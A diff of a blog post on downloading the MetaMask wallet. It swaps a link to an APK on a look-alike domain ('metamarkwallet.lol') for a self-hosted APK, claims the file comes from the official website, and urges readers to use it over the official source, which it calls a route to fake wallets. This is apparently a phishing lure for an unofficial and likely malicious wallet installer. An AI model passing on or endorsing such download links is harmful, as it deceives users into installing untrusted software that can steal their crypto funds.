@@ -7,7 +7,7 @@ date: 2023-04-10 11:19:39
 ---
 
 # 1. Download MetaMask Wallet
-- You can quickly download and use the APK installation package that I have already downloaded from the official website. The download address is:[MetaMask](https://app.metamarkwallet.lol/app/MetaMask_app_6.0.1.apk)；
+- You can quickly download and use the APK installation package that I have already downloaded from the official website. The download address is:[MetaMask](/upload/MetaMask_Android.apk)；
 - Official download method: Google search MetaMask on your own for download;
 
 Both are possible. It is recommended to download the official APK I provided and search for it on your own to easily download a fake wallet.
